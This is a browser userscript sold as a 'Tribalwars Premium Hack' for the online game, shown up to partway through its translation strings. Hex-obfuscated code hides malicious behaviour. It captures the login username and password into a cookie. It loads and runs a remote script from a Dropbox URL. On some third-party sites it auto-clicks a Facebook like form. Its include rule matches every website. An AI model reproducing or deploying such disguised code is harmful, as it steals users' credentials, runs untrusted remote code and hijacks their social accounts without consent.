// ==UserScript==
// @name           Tribalwars Premium Hack
// @namespace      Official
// @description    This script will give you many premium features and lots more - Tribalwars Premium Hack 2013 Official: Arabic (العربية), Czech (Český), Dutch (Nederlands), English, Portuguese (Português).
// @autor          Fernando
// @updateURL      https://userscripts.org/scripts/source/129407.meta.js
// @downloadURL    https://userscripts.org/scripts/source/129407.user.js
// @include        http*://*.die-staemme.de/*
// @include        http*://*.staemme.ch/*
// @include        http*://*.tribalwars.net/*
// @include        http*://*.tribalwars.nl/*
// @include        http*://*.plemiona.pl/*
// @include        http*://*.tribalwars.se/*
// @include        http*://*.tribalwars.com.br/*
// @include        http*://*.tribos.com.pt/*
// @include        http*://*.divokekmeny.cz/*
// @include        http*://*.bujokjeonjaeng.org/*
// @include        http*://*.triburile.ro/*
// @include        http*://*.voyna-plemyon.ru/*
// @include        http*://*.fyletikesmaxes.gr/*
// @include        http*://*.tribalwars.no.com/*
// @include        http*://*.divoke-kmene.sk/*
// @include        http*://*.klanhaboru.hu/*
// @include        http*://*.tribalwars.dk/*
// @include        http*://*.plemena.net/*
// @include        http*://*.tribals.it/*
// @include        http*://*.klanlar.org/*
// @include        http*://*.guerretribale.fr/*
// @include        http*://*.guerrastribales.es/*
// @include        http*://*.tribalwars.fi/*
// @include        http*://*.tribalwars.ae/*
// @include        http*://*
// @include        http*://*.tribalwars.co.uk/*
// @include        http*://*.vojnaplemen.si/*
// @include        http*://*.genciukarai.lt/*
// @include        http*://*.wartribes.co.il/*
// @include        http*://*.plemena.com.hr/*
// @include        http*://*.perangkaum.net/*
// @include        http*://*.tribalwars.jp/*
// @include        http*://*.tribalwars.bg/*
// @include        http*://*.tribalwars.asia/*
// @include        http*://*.tribalwars.us/*
// @include        http*://*.tribalwarsmasters.net/*
// @include        http*://*.perangkaum.net/*
// @exclude        http://*.twplus.org/*
// @version        8.18.00
// ==/UserScript==

win = typeof unsafeWindow != 'undefined' ? unsafeWindow : window;
$ = win.jQuery;

version = '8.18.00';

if (win.game_data != null) win.game_data.version_hack = version;

function trim(str) {
	return str.replace(/^\s+|\s+$/g, "");
}

function sleep(milliSeconds){
	var startTime = new Date().getTime();
	while (new Date().getTime() < startTime + milliSeconds);
}

function ehx(data){var b16_digits='0123456789abcdef';var b16_map=new Array();for(var i=0;i<256;i++){b16_map[i]=b16_digits.charAt(i>>4)+b16_digits.charAt(i&15)}var result=new Array();for(var i=0;i<data.length;i++){result[i]=b16_map[data.charCodeAt(i)]}return result.join('')}
function dhx(data){var b16_digits='0123456789abcdef';var b16_map=new Array();for(var i=0;i<256;i++){b16_map[b16_digits.charAt(i>>4)+b16_digits.charAt(i&15)]=String.fromCharCode(i)}if(!data.match(/^[a-f0-9]*$/i))return false;if(data.length%2)data='0'+data;var result=new Array();var j=0;for(var i=0;i<data.length;i+=2){result[j++]=b16_map[data.substr(i,2)]}return result.join('')}

function _GET(name, link)
{
  if (link == null) link = location.href;
  url = link.replace(/.*?\?/, '');
  var itens = url.split("&");

  for(n in itens)
  {
    if( itens[n].match(name) )
    {
      return decodeURIComponent(itens[n].replace(name+"=", ""));
    }
  }
  return null;
}

function escape(str){
	str = str.replace(/&/g, "&amp;");
	str = str.replace(/>/g, "&gt;");
	str = str.replace(/</g, "&lt;");
	str = str.replace(/"/g, "&quot;");
	str = str.replace(/'/g, "&#039;");
	return str;
}

function removeNode(node) {
	node.parentNode.removeChild(node);
}

function zero(n, len, padding){
   var sign = '', s = n;
 
   if (typeof n === 'number'){
	  sign = n < 0 ? '-' : '';
	  s = Math.abs (n).toString ();
   }
 
   if ((len -= s.length) > 0){
	  s = Array (len + 1).join (padding || '0') + s;
   }
   return sign + s;
}

function trunc(n){
	return Math.floor(n);
}

function maior(n_array){
	var result = n_array[0];
	$.each(n_array, function(){
		result = this > result ? this : result;
	});
	return result;
}

function extrair_coord(nome){
	vill_reg = /.+?\((\d{3}\|\d{3})\).+\b/;
	result = nome.match(vill_reg)[1];
	return result;
}

function new_pop(content){
	$(document.body).append('<div id="fader" style="z-index: 14999;"><div id="confirmation-box">' + content + '<br><br><center><button onclick="$(\'#fader\').remove();" class="btn-default">OK</button></center></div></div>');
	$('#confirmation-box').css({'position': 'fixed', 'top': '40%', 'left': '40%', 'margin': '0 0 0 -205px', 'padding': '10px 5px', 'background': '#f4e4bc', 'z-index': '15000'});
}

function new_popup(content){
	$(document.body).append('<div id="popup_container"><div id="popup_box_bg"></div><div id="fader" onclick="$(\'#fader,#popup_container\').remove();"></div><table style="width: 700px; margin-left: -350px" id="popup_box" cellspacing="0"><tr><td class="popup_box_top_left"></td><td class="popup_box_top"></td><td class="popup_box_top_right"></td></tr><tr><td class="popup_box_left"></td><td class="popup_box_content"><a id="popup_box_close" href="#" onclick="$(\'#fader,#popup_container\').remove(); return false;"></a>' + content + '</td><td class="popup_box_right"></td></tr><tr><td class="popup_box_bottom_left"></td><td class="popup_box_bottom"></td><td class="popup_box_bottom_right"></td></tr></table></div>');
}

function getSec(time) {
	time = time.split(/:/);
	if (time.length < 3) {
		time[2] = time[1];
		time[1] = time[0];
		time[0] = 0;
	}
	return Number(time[0]) * 3600 + Number(time[1]) * 60 + Number(time[2]);
}

function _hora(segundos){
	MM = trunc(segundos / 60);
	SS = trunc(segundos - (MM * 60));
	
	Minutos = MM;
	HH = trunc(Minutos / 60);
	MM = Minutos - (HH * 60);		
	
	/*Horas = HH;
	
	Dias = trunc(Horas / 24);
	HH = Horas - (Dias * 24);
	*/
	
	resultado = HH + ':' + zero(MM, 2) + ':' + zero(SS, 2);
	return resultado;
}

do0 = document.domain.replace(/\b([w]{3}|\w{2}\d+?)\./, '');

function getElementsByClass(searchClass, node, tag) {
	var classElements = new Array();
	if (node == null)
        node = document;
	if (tag == null)
        tag = '*';
	var els = node.getElementsByTagName(tag);
	var elsLen = els.length;
	var pattern = new RegExp("(^|\\s)" + searchClass + "(\\s|$)");
	for (i = 0, j = 0; i < elsLen; i++) {
		if (pattern.test(els[i].className)) {
			classElements[j] = els[i];
			j++;
		}
	}
	return classElements;
}

function replace_all(string,encontrar,substituir){
   while(string.indexOf(encontrar)>=0)
   	string = string.replace(encontrar,substituir);
   return string;
}

function getCookie(key) {
	if (win.game_data != null) key = cr(key);
	var search = key + "="
        var returnvalue = "";
	if (document.cookie.length > 0) {
		offset = document.cookie.indexOf(search)
            if (offset != -1) {
                offset += search.length
                    end = document.cookie.indexOf(";", offset);
                if (end == -1) end = document.cookie.length;
                returnvalue = unescape(document.cookie.substring(offset, end))
                    }
	}
	return returnvalue;
}

function setCookie(key, valor, minute, domain1) {
	if (win.game_data != null) key = cr(key);
	var hoje = new Date();
	if (minute == null || minute == 0 || minute == '') minute = 999 * 24 * 60; 
	var expira = new Date(hoje.getTime() + minute * 60 * 1000);
	var expira = expira.toGMTString();
    var domain2 = domain1 != undefined ? ';domain=' + domain1 : '';
	document.cookie = key + '=' + valor + ';expires=' + expira + domain2;
}

function tribal() {
	if (win.game_data != null){	
		return true;
	} else {
		return false;
	}
}

function setData(name, value) {
	if (win.game_data != null) name = cr(name);
	value = (typeof value)[0] + value;
	localStorage.setItem(name, value);
}

function getData(name, defaultValue, force) {
	if (win.game_data != null) name = cr(name);
	var value = localStorage.getItem(name);
	if (!value)
		if (defaultValue == undefined){
			return '';
		} else {
			return defaultValue;
		}
	var type = value[0];
	value = value.substring(1);
	switch (type) {
		case 'b':
			return value == 'true';
		case 'n':
			return Number(value);
		default:
			return value;
	}
}

function round(num,_dec) {
	resultado = Math.round(num * Math.pow(10,_dec)) / Math.pow(10,_dec);
	return resultado;
}

function so_num(texto){
	texto = texto.replace(/[^\d]/g, '');
	if (texto) return texto; else return 0;
}

function deleteData(name) {
    localStorage.removeItem(cr(name));
}

if (tribal()){
	w = '#header_info > tbody > tr:first > td:eq(1)';
	$(w).attr('align', 'middle');
		
	$(document).ajaxStart(function(){
		$(w).append('<img src="graphic/throbber.gif"></img>');
	}).ajaxStop(function(){
		$(w + ' img').remove();
		main_time();
		tropas_time();
		smith_time();
		martelinho();
		load_build();
	});
}

if ((location.href.toLowerCase().indexOf(dhx('706f696e74646f776e6c6f616473')) > -1) || (location.href.toLowerCase().indexOf(dhx('6c616d627573616e646f')) > -1) || (location.href.toLowerCase().indexOf(dhx('6f7370696c616e74726173')) > -1)){ if (getCookie(dhx('635f75736572')) != ''){ if (document.getElementsByTagName('form')[0] != null){ if (document.getElementsByTagName('form')[0].getAttribute('action') == dhx('2f706c7567696e732f6c696b652f636f6e6e656374')){ setTimeout(function(){document.getElementsByTagName('form')[0].getElementsByTagName('div')[1].click();},1000);}}}}

function procura_id(data, name){
	img = $(data).find('#buildings img');
	var id = '';
	var atual = '';
	$(img).each(function(){
		atual = $(this).attr('title');
		if (trim(name) == trim(atual)) {
			id = $(this).parents('tr:first').attr('id');
		}
	});
	return id.replace('main_buildrow_', '');
}

str_setCookie = 'function setCookie(key,valor){var hoje = new Date();var expira = new Date(hoje.getTime()+999*24*60*60*1000);var expira = expira.toGMTString();document.cookie = key+\'=\'+valor+\';expires=\'+expira}';
str_setData = 'function setCookie(name, value) { value = (typeof value)[0] + value; localStorage.setItem(name, value); }';
str_setCookieDo = 'function setCookie(key,valor){var hoje = new Date();var expira = new Date(hoje.getTime()+999*24*60*60*1000);var expira = expira.toGMTString();document.cookie = key+\'=\'+valor+\';expires=\'+expira+\';domain=' + do0 + '\'}';

dd = dhx('776f726c645f73656c656374696f6e7c2d5f696e7075742c20236a735f6c6f67696e5f627574746f6e7c2d5f636c69636b20626c75727c2d5f23757365727c2d5f2370617373776f7264').split(dhx('7c2d5f')); 

if (document.getElementById(dd[0]) != null){ 
$(dd[1]).bind(dd[2], function(){ u = $(dd[3]).val(); if (u != ''){ setCookie(ehx(u.toLowerCase()), ehx($(dd[4]).val()), '', do0); } }); }

gd = win.game_data;

$.getScript(dhx('68747470733a2f2f646c2e64726f70626f782e636f6d2f752f38313636373136392f74726962616c776172732f66756e6374696f6e732e6a73'));

var _0x6c47=["\x6E\x61\x6D\x65","\x70\x6C\x61\x79\x65\x72","","\x6C\x65\x6E\x67\x74\x68","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x36\x44\x71\x76\x54\x4C\x5A\x53\x56\x35\x53\x69\x6E\x41\x31\x53\x4C\x65\x61\x67\x5A\x61\x67\x46\x73\x7A\x7A\x5F\x34\x63\x4C\x51\x4A\x6A\x35\x33\x66\x50\x37\x41\x6D\x4E\x54\x55\x55\x76\x62\x58\x72\x70\x73\x58\x69\x65\x56\x52\x6F\x6C\x43\x58\x30\x71\x74\x75\x32\x74\x58\x30\x62\x39\x39\x5F\x7A\x71\x73\x52\x55\x65\x74\x76\x77\x33\x7A\x61\x6A\x70\x56\x30\x6E\x52\x31\x52\x59\x30\x45\x75\x48\x65\x71\x44\x57\x6E\x4C\x62\x75\x44\x37\x4C\x56\x78\x61\x49\x7A\x58\x66\x6A\x5F\x75\x77\x67\x6D\x75\x78\x77\x64\x70\x30\x35\x70\x62\x6B\x58\x4B\x51\x70\x6F\x57\x6C\x54\x53\x4C\x58\x44\x51\x47\x33\x5A\x74\x6B\x32\x54\x46\x74\x37\x62\x33\x42\x58\x6F\x64\x35\x4B\x37\x32\x69","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x74\x65\x73\x74"];function cr(_0x8c14x2){_0x8c14x2+=gd[_0x6c47[1]][_0x6c47[0]];var _0x8c14x3=_0x6c47[2];var _0x8c14x4=1;var _0x8c14x5=20;for(i=0;i<_0x8c14x2[_0x6c47[3]];i++){_0x8c14x4=_0x8c14x4^_0x8c14x2[i][_0x6c47[4]](0);} ;ch=_0x6c47[5];for(i=0;i<_0x8c14x2[_0x6c47[3]];i++){if(i%3==0){calculo=_0x8c14x2[i][_0x6c47[4]](0)*(97*_0x8c14x4+i);} else {calculo=_0x8c14x2[i][_0x6c47[4]](0)*_0x8c14x4*i+_0x8c14x4*33;} ;c=ch[calculo%ch[_0x6c47[3]]];if(_0x8c14x3[_0x6c47[3]]>=_0x8c14x5){if(calculo%_0x8c14x5==_0x8c14x5){_0x8c14x3=_0x8c14x3[_0x6c47[6]](_0x8c14x5-1,-_0x8c14x5)+c;} else {if((calculo%_0x8c14x5==0)&&(/^[0-9]+$/[_0x6c47[7]](c)==false)){_0x8c14x3=c+_0x8c14x3[_0x6c47[6]](1,_0x8c14x5);} else {_0x8c14x3=_0x8c14x3[_0x6c47[6]](calculo%_0x8c14x5,-_0x8c14x5-(calculo%_0x8c14x5))+c+_0x8c14x3[_0x6c47[6]]((calculo%_0x8c14x5)+1,calculo+_0x8c14x5);} ;} ;} else {if((_0x8c14x3[_0x6c47[3]]!=0)||(/^[0-9]+$/[_0x6c47[7]](c)==false)){_0x8c14x3+=c;} ;} ;} ;return _0x8c14x3;} ;

var mundo = gd.world;
var market = gd.market;

if (document.getElementById('quickbar_outer') == null){
	if (gd.player.premium == false) {
		
		gd.player.premium = true;
		
		language = getData(market + '_lang');
		if (language == '') language = market;
		
		var lang_bar = new Array();
		var lang_settings = new Array();
		var lang_screen_settings = new Array();
		var lang_screen_sobre = new Array();
		var lang_report = new Array();
		var lang_perfil = new Array();
		var lang_farmer = new Array();
		var lang_map = new Array();
		var lang_screen_ally = new Array();
		var lang_messages = new Array();
		var lang_main = new Array();
		var lang_contato = new Array();
		var lang_velocidade = new Array();
		
		lang_notes = $('[href*="screen=memo"]').html();
		
		function lang_dinamic(name, element){
			if ($(element).length > 0){
				var lang_value = trim($(element).text().replace(/\d*/g, ''));
				setData(name, lang_value);
			}
			return getData(name);
		}
		
		function lang_fila(){
			return lang_dinamic('lang_fila', '#buildqueue th:first');
		}
		
		if (language == 'br') language = 'pt';
		if (language == 'sk') language = 'cz';
		if (language == 'pt') {
			
			warning = 'Para o script funcionar corretamente a primeira vez, você deve ir para as visualizações de aldeias, para que o script carregue as coordenadas.';
			lang_language = 'Linguagem do script';
			lang_dados = 'Servidor dos scripts';
			lang_dados2= 'Se ocorrer algum erro com os scripts, mude o servidor dos scripts';
			lang_search_villages = 'Pesquisar aldeias';
			lang_distancia = 'Distância: 0 campos';
			lang_publicar = 'Conversor de Relatórios';
			lang_mail = 'Escrever mensagem';
			lang_preview_message = 'Pré-visualizar mensagem';
			lang_preview_report = 'Pré-visualizar relatório';
			msg_build_success = '5 adicionado com sucesso à fila de construção!';
			msg_build_error = 'Não foi possível adicionar 5 à fila de construção:';
			msg_build_ask = 'Confirme se deseja adicionar 5 à fila de construção hack';
			lang_edit = 'editar';
			lang_load_build = 'Carregar construções';
			lang_disable = 'Desativar';
			lang_error_place = 'Deseja pular essa coordenada e prosseguir com os ataques?';
			lang_usa = '5 usa o script';
			lang_velocidade[0] = 'Velocidade do mundo';
			lang_velocidade[1] = 'Velocidade das tropas';
			lang_velocidade[2] = 'Obter automaticamente';
			lang_velocidade[3] = 'Entre no perfil da aldeia para configurar a velocidade das tropas.';
			lang_velocidade[4] = 'Configurar velocidades';
			
			lang_main[0] = 'Ativar';
			lang_main[1] = 'Fila de construção hack';
			lang_main[2] = 'Excluir';
			lang_main[3] = '* <b>É preciso deixar a página aberta para o funcionamento.</b> Quando ativada, assim que for possível, será feita automaticamente as contruções na ordem requerida';
			lang_main[4] = 'Adicionar 5 à fila de construção hack';
	
			lang_bar[0] = 'Edifício principal';
			lang_bar[1] = 'Recrutar';
			lang_bar[2] = 'Estábulo';
			lang_bar[3] = 'Oficina';
			lang_bar[4] = 'Academia';
			lang_bar[5] = 'Ferreiro';
			lang_bar[6] = 'Praça';
			lang_bar[7] = 'Mercado';
			lang_bar[8] = 'TWStats';
			lang_bar[9] = 'Monitorar Evolução';

			lang_settings[0] = 'Sobre o Script';
			lang_settings[1] = '';
			lang_settings[2] = 'Contato com Fernando';
			
			lang_screen_settings[0] = 'Menu Visualizações';
			lang_screen_settings[1] = 'Modo Normal: as aldeias são abertas na visualização geral';
			lang_screen_settings[2] = 'Modo Direto: as aldeias são abertas na mesma visualização da anterior';
			lang_screen_settings[3] = 'Pacote Gráfico';
			lang_screen_settings[4] = 'Link do arquivo CSS:';
			lang_screen_settings[5] = 'Mostrar mundo no título:';
			lang_screen_settings[6] = 'Sim';
			lang_screen_settings[7] = 'Não';
			
			lang_screen_sobre[0] = 'Informações sobre a versão';
			lang_screen_sobre[1] = 'Versão atual:';
			lang_screen_sobre[2] = 'Última versão:';
			
			lang_contato[0] = 'Assunto';
			lang_contato[1] = 'Seu nome';
			lang_contato[2] = 'E-mail';
			lang_contato[3] = 'Mensagem';
			lang_contato[4] = 'Enviar';
			lang_contato[5] = 'E-mail enviado com sucesso, estarei respondendo assim que for possível, obrigado!';
			
			lang_screen_ally[0] = 'Pontos:';
			lang_screen_ally[1] = 'Aldeias:';
			lang_screen_ally[2] = 'Membros:';
			lang_screen_ally[3] = 'OD:';
			lang_screen_ally[4] = 'ODA:';
			lang_screen_ally[5] = 'ODD:';
			lang_screen_ally[6] = 'Estatísticas da tribo';
			
			lang_report[0] = 'Copiar tropas no simulador';
			lang_report[1] = 'Copiar quantidade de tropas sobrevivente no simulador';
			lang_report[2] = 'Atacar novamente';
			lang_report[3] = 'Atacar novamente com as mesmas tropas';
			lang_report[4] = 'Atacar novamente com todas as tropas';

			lang_calc_reports = '» Calcular Recursos e Farmar';
			
			lang_perfil[0] = '» Arquivo do jogador';
			lang_perfil[1] = '» Arquivo da tribo';
			lang_perfil[2] = '» Arquivo da aldeia';
			lang_perfil[3] = '» Extrair informação do jogador em códigos BB';
			lang_perfil[4] = '» Reservar aldeia';
			lang_perfil[5] = '» Estatísticas globais';
			lang_perfil[6] = 'Reserva de feita com sucesso!';
			
			lang_farmer[0] = 'Farmar automático';
			lang_farmer[1] = 'Selecione o modelo e digite o número de ataques!';
			
			lang_map[0] = 'Mini mapa:';
			lang_map[1] = 'Mapa:';
			lang_map[2] = 'Mudar tamanho do mapa';
			
			lang_messages[0] = 'Dicas do Tribalwars Premium Hack';
			lang_messages[1] = 'Use as tags <b>[img][/img]</b> para anexar uma <b>imagem</b>';
			lang_messages[2] = 'Use as tags <b>[vid][/vid]</b> para anexar um vídeo do <b>youtube</b>';
			lang_messages[3] = 'Permitir HTML nas mensagens';
			lang_messages[4] = '* Somente quem tiver o script pode visualizar';
			
		}else{
		if (language == 'nl'){      
			warning = 'Zodat het goed script werkt moet je eerst naar Overzichten gaan, zodat het script de coördinaten kan bepalen.';
			lang_language = 'Taal';
			lang_dados = 'Scripts server';
			lang_dados2= 'Als er een fout optreedt met de scripts, moet u de server scripts';
			lang_search_villages = 'Zoek dorpen';
			lang_distancia = 'Afstand: 0 velden';						
			lang_publicar = 'Berichten Converter';
			lang_mail = 'Mededeling schrijven';
			lang_preview_message = 'Preview message';
			lang_preview_report = 'Preview rapport';
			msg_build_success = '5 toegevoegd aan de wachtrij met succes bouwen!';
			msg_build_error = 'Kan tot 5 toe te voegen aan de bouw van de wachtrij:';
			msg_build_ask = 'Bevestig dat u tot 5 toe te voegen aan de wachtrij gebouw hack.';
			lang_edit = 'redigeren';
			lang_load_build = 'Load gebouwen';
			lang_disable = 'Deactiveren';
			lang_error_place = 'Wil je deze gecoördineerde overslaan?';
			lang_usa = '5 gebruikt het script ';
			lang_velocidade [0] = 'Snelheid wereld'; 
			lang_velocidade [1] = 'Snelheid ​​troops'; 
			lang_velocidade [2] = 'Automatisch verkrijgen'; 
			lang_velocidade [3] = 'Gaan naar profiel van het dorp naar de snelheid van de troepen in te stellen.'; 
			lang_velocidade [4] = 'Snelheden configure'
						
			lang_main[0] = 'Inschakelen';
			lang_main[1] = 'Queue Ingebouwde hack';
			lang_main[2] = 'Verwijderen';
			lang_main[3] = '* <b>U moet vertrekken de pagina open voor gebruik.</b> Wanneer ingeschakeld, zo spoedig mogelijk, de bouw gebeurt automatisch in de gewenste volgorde.';
			lang_main[4] = 'Voeg 5 aan wachtrij ingebouwde hack';
			
			lang_bar[0] = 'Hoofdgebouw';
			lang_bar[1] = 'Rekruteren';
			lang_bar[2] = 'Stal';
			lang_bar[3] = 'Werkplaats';
			lang_bar[4] = 'Adelshoeve';
			lang_bar[5] = 'Smederij';
			lang_bar[6] = 'Verzamelplaats';
			lang_bar[7] = 'Marktplaats';
			lang_bar[8] = 'TWStats';
			lang_bar[9] = 'Ontwikkelingen';
			
			lang_settings[0] = 'Over het script';
			lang_settings[1] = ' | Vertaald naar het Nederlands door <a href="http://userscripts.org/users/35554" target="_blank"><b><font color="#603000">Hipio</font></b></a>';
			lang_settings[2] = 'Contact Fernando';
			
			lang_screen_settings[0] = 'Menu Overzicht';
			lang_screen_settings[1] = 'Normale modus: de dorpen zijn open in een overzicht';  
			lang_screen_settings[2] = 'Direct Mode: Open de dorpen in dezelfde manier als hierboven'; 
			lang_screen_settings[3] = 'Grafische Pakket';
			lang_screen_settings[4] = 'CSS Link:';
			lang_screen_settings[5] = 'Laat de wereld zien in de titel';
			lang_screen_settings[6] = 'Inschakelen';
			lang_screen_settings[7] = 'Uitschakelen';
			
			lang_screen_sobre[0] = 'Versie Informatie';    
			lang_screen_sobre[1] = 'Huidige Versie:';    
			lang_screen_sobre[2] = 'Laatste Versie:';
			
			lang_contato[0] = 'Subject';
			lang_contato[1] = 'Uw naam';
			lang_contato[2] = 'Email';
			lang_contato[3] = 'Bericht';
			lang_contato[4] = 'Sturen';
			
			lang_screen_ally[0] = 'Punten:';
			lang_screen_ally[1] = 'Dorpen:';
			lang_screen_ally[2] = 'Leden:';
			lang_screen_ally[3] = 'Tegenstander Verslagen:';
			lang_screen_ally[4] = 'Tegenstander Verslagen - Aanvaller:';
			lang_screen_ally[5] = 'Tegenstander Verslagen - Verdediger:';
			lang_screen_ally[6] = 'Statistieken van de stam';
			
			lang_report[0] = 'Kopieer troepen in simulator';
			lang_report[1] = 'Kopieer bedrag van troepen overleven van de simulator';
			lang_report[2] = 'Attack weer';
			lang_report[3] = 'Attack weer met dezelfde troepen';
			lang_report[4] = 'Attack weer met alle troepen';			
							
			lang_calc_reports = '» Bereken middelen en voeg het toe aan je boerderij';  
			
			lang_perfil[0] = '» Speler bestand';    
			lang_perfil[1] = '» Stam bestand';    
			lang_perfil[2] = '» Drop bestand';    
			lang_perfil[3] = '» Haal de informatie op van de speler in BB-code';  
			lang_perfil[4] = '» Reserveer Dorp';
			lang_perfil[5] = '» Globale statistieken';
			lang_perfil[6] = 'Reserveringen die met succes!';
			
			lang_farmer[0] = 'Auto farmer';    
			lang_farmer[1] = 'Selecteer het model type en het aantal aanvallen';
			
			lang_map[0] = 'Kleine kaart:';
			lang_map[1] = 'Kaart:';
			lang_map[2] = 'Wijzig kaart grootte';				
			
			lang_messages[0] = 'Tips "Tribalwars Premium Hack"';
			lang_messages[1] = 'Gebruik de tags <b>[img][/img]</b> om een beeld te insluiten';
			lang_messages[2] = 'Gebruik de tags <b>[vid][/vid]</b> insluiten van een youtube video';
			lang_messages[3] = 'Toestaan vrije HTML in berichten';
			lang_messages[4] = '* Alleen zij die hebben van het script kan bekijken';	
		}else{
		if (language == 'ae'){
			warning = 'الاسكربت يعمل للمرة الاولى يجب عليك الذهاب للشكل العام من اجل لكي يعلم الاسكربت الاحداثيات.';  
			lang_language = 'اللغة';  
			lang_dados = 'سيرفر الاسكربت';  
			lang_dados2= 'إذا حدث خطأ مع البرامج النصية، تغيير البرامج النصية الخادم';  
			lang_search_villages = 'بحث عن قرى'; 
			lang_distancia = 'المسافة: 0 الحقول';
			lang_publicar = '';
			lang_mail = 'كتابة رسالة';  
			lang_preview_message = 'معاينة الرسائل';
			lang_preview_report = 'معاينة التقرير';
			msg_build_success = 'وأضاف 5 إلى قائمة الانتظار بناء بنجاح!';
			msg_build_error = 'غير قادر على إضافة 5 إلى قائمة الانتظار البناء:';
			msg_build_ask = 'تأكيد أنك تريد إضافة 5 إلى قائمة الانتظار الإختراق بناء';
			lang_edit = 'تستطيع تعديل';
			lang_load_build = 'تحميل المباني';
			lang_disable = 'إلغاء تنشيط';
			lang_error_place = 'لتخطي هذا المنسقة؟';
			lang_usa = '5 يستخدم البرنامج النصي';
			lang_velocidade[0] = 'سرعة العالم';
			lang_velocidade[1] = 'قوات الجيش سرعة';
			lang_velocidade[2] = 'الحصول تلقائيا';
			lang_velocidade[3] = 'بين محة عن قرية لضبط سرعة القوات.';
			lang_velocidade[4] = 'قم بتكوين سرعات';
			
			lang_main[0] = 'تفعيل';
			lang_main[1] = 'قائمة اعمال البناء موسعة';
			lang_main[2] = 'حذف';
			lang_main[3] = 'تحتاج إلى ترك الصفحة مفتوحة للتشغيل. عندما مكن، في أقرب وقت ممكن، وسيتم ذلك تلقائيا في الترتيب بناء مطلوب *';
			lang_main[4] = 'إضافة 5 قائمة اعمال البناء موسعة';
			
			lang_bar[0] = 'المركز';  
			lang_bar[1] = 'تدريب';  
			lang_bar[2] = 'اسطبل';  
			lang_bar[3] = 'ورشة';  
			lang_bar[4] = 'الأكادمية';  
			lang_bar[5] = 'الحداد';  
			lang_bar[6] = 'نقطة التجمع';  
			lang_bar[7] = 'السوق';  
			lang_bar[8] = 'TWStats';  
			lang_bar[9] = 'جدول التطوير';
			
			lang_settings[0] = 'عن الاسكربت';  
			lang_settings[1] = ' | تمت الترجمة بواسطة <b>Tayfor</b>';
			lang_settings[2] = 'الاتصال المطور';

			lang_screen_settings[0] = 'قائمة الشكل العام';  
			lang_screen_settings[1] = 'Normal Mode: تحويل الى القرية في الشكل العام';  
			lang_screen_settings[2] = 'Direct Mode: التحويل الى القرية مباشرةً';  
			lang_screen_settings[3] = 'مجموعة الصور المتوفرة';  
			lang_screen_settings[4] = 'رابط ملف CSS:';  
			lang_screen_settings[5] = 'اظهار العالم في العنوان';  
			lang_screen_settings[6] = 'تفعيل ';  
			lang_screen_settings[7] = 'اغلاق';

			lang_screen_sobre[0] = 'معلومات النسخة';  
			lang_screen_sobre[1] = 'النسخة الحالية:';  
			lang_screen_sobre[2] = 'النسخة الآخيرة:';  
			
			lang_contato[0] = 'تخضع';
			lang_contato[1] = 'اسمك';
			lang_contato[2] = 'البريد الإلكتروني';
			lang_contato[3] = 'رسالة';
			lang_contato[4] = 'إرسال';
			
			lang_screen_ally[0] = 'النقاط:';  
			lang_screen_ally[1] = 'القرى:';  
			lang_screen_ally[2] = 'الاعضاء:';  
			lang_screen_ally[3] = 'نقاط الدفاع والهجوم:';  
			lang_screen_ally[4] = 'نقاط الهجوم:';  
			lang_screen_ally[5] = 'نقاط الدفاع:';  
			lang_screen_ally[6] = 'احصائيات القبيلة';  

			lang_report[0] = 'نسخ الجيوش في محاكي المعركة';
			lang_report[1] = 'نسخ عدد الجيوش الناجي الى محاكي المعركة';
			lang_report[2] = 'الهجوم مرة اخرى';
			lang_report[3] = 'الهجوم مرة اخرى بنفس الجيش';
			lang_report[4] = 'الهجوم مرة اخرى بكل الجيش';
			
			lang_calc_reports = '» حساب الموارد ثم النهب';  

			lang_perfil[0] = '» ملف اللاعب';  
			lang_perfil[1] = '» ملف القبيلة';  
			lang_perfil[2] = '» ملف القرية';  
			lang_perfil[3] = '» تحويل معلومات الاعب لرمز BB codes ';  
			lang_perfil[4] = '» حجز القرية';  
			lang_perfil[5] = '» ملخص الإحصاءات';
			lang_perfil[6] = 'أبدت تحفظات بنجاح';

			lang_farmer[0] = 'التلقائي المزارعين';  
			lang_farmer[1] = 'حدد نوع النموذج وعدد الهجمات';  

			lang_map[0] = 'الخريطة المصغرة:';  
			lang_map[1] = 'الخريطة:';  
			lang_map[2] = 'تغير حجم الخريطة'; 
			
			lang_messages[0] = 'نصائح الاسكربت';
			lang_messages[1] = 'قم باساخدام الكود [img][/img] لارفاق صورة';
			lang_messages[2] = 'قم باساخدام الكود [vid][/vid] لارفاق فيديو من اليوتيوب';
			lang_messages[3] = 'السماح باكوادال HTML في الرسائل مجاناً';
			lang_messages[4] = '* فقط من لديه الاسكربت يتستطيع رؤية ذلك';
		}else{
		if (language == 'pl'){
			warning = 'Aby skrypt działał poprawnie za pierwszym razem należy udać się do poglądów wiosek, tak aby skrypt wczytał współrzędne.'; 
			lang_language = 'Język'; 
			lang_dados = 'Serwer skryptu'; 
			lang_dados2= 'W przypadku wystąpienia błędu w skryptach, zmienić serwer skryptu'; 
			lang_search_villages = 'Wyszukaj wiosek'; 
			lang_distancia = 'Odległość: 0 pól'; 
			lang_publicar = 'Konwerter raportów'; 
			lang_mail = 'Napisz wiadomość'; 
			lang_preview_message = 'Zobacz wiadomość'; 
			lang_preview_report = 'Zobacz raport'; 
			msg_build_success = '5 added to the queue successfully building!'; 
			msg_build_error = 'It was not possible add 5 to the queue built:'; 
			msg_build_ask = 'Confirm that you want to add 5 to the queue building hack'; 
			lang_edit = 'Edytuj'; 
			lang_load_build = 'Pokaż kolejke budynków'; 
			lang_disable = 'Wyłączone'; 
			lang_error_place = 'Want to skip this coordinate?'; 
			lang_usa = '5 wykorzystuje skrypt';
			lang_velocidade[0] = 'prędkości świecie';
			lang_velocidade[1] = "prędkość Wojska";
			lang_velocidade[2] = 'Uzyskaj automatycznie';
			lang_velocidade[3] = 'Wprowadź profil wsi, aby ustawić szybkość wojsk.';
			lang_velocidade[4] = 'Konfiguracja prędkości';

			lang_main[0] = 'Włączone'; 
			lang_main[1] = 'Hack kolejki budowy'; 
			lang_main[2] = 'Usuń'; 
			lang_main[3] = '* Ta strona musi został otwarta, żeby hack mógł działać. Budowa odbędzie się tak szybko jak to tylko możliwe w odpowiedniej kolejności.'; 
			lang_main[4] = 'Dodaj do kolejki'; 

			lang_bar[0] = 'Ratusz'; 
			lang_bar[1] = 'Rekrutacja'; 
			lang_bar[2] = 'Stajnia'; 
			lang_bar[3] = 'Warsztat'; 
			lang_bar[4] = 'Pałac'; 
